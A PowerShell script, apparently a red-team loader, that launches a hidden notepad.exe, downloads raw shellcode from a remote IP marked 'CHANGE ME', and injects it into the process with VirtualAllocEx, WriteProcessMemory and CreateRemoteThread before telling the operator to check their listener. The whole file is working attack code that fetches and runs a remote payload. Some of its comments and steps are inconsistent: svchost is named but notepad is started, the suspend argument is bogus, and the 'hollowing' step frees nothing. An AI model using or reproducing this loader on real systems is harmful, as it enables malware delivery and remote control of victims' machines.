# Check that we are running as 64bit process
if ([System.IntPtr]::Size -ne 8) {
    Write-Error "This script must be run as a 64-bit process."
    exit
}

# Step 2: Start svchost.exe in suspended mode
Write-Host "Starting notepad.exe..."
$notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru -ArgumentList "/suspend"
$procid = $notepadProcess.Id
Write-Host "Started notepad.exe with PID: $procid"

# Step 3: Download the raw shellcode from the remote server
$url = "http://192.168.45.168/agent.bin" # CHANGE ME
$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ResumeThread(IntPtr hThread);
}
"@ -Language CSharp

$PROCESS_ALL_ACCESS = 0x1F0FFF
$PROCESS_CREATE_THREAD = 0x0002
$PROCESS_VM_OPERATION = 0x0008
$PROCESS_VM_WRITE = 0x0020
$PROCESS_VM_READ = 0x0010
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

# Open the process in suspended mode
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open process."
    exit
}

# Retrieve process information (Get entry point & image base)
$hThread = (Get-Process -Id $procid).Threads[0].Id
$procInfo = (Get-WmiObject Win32_Process -Filter "ProcessId = '$procid'").ExecutablePath

# Allocate memory in the target process
$size = $shellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory in the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Write shellcode to the allocated memory
$out = 0
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Free the memory of the original image (process hollowing)
$peBaseAddr = [IntPtr]::Zero
[Kernel32]::VirtualFreeEx($hProcess, $peBaseAddr, 0, 0x8000)

# Resume the process after injection of shellcode
$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread in the target process."
}
else {
    [Kernel32]::ResumeThread($thread)
    Write-Output "Shellcode injected, check your listener!"
}

[Kernel32]::CloseHandle($hProcess)
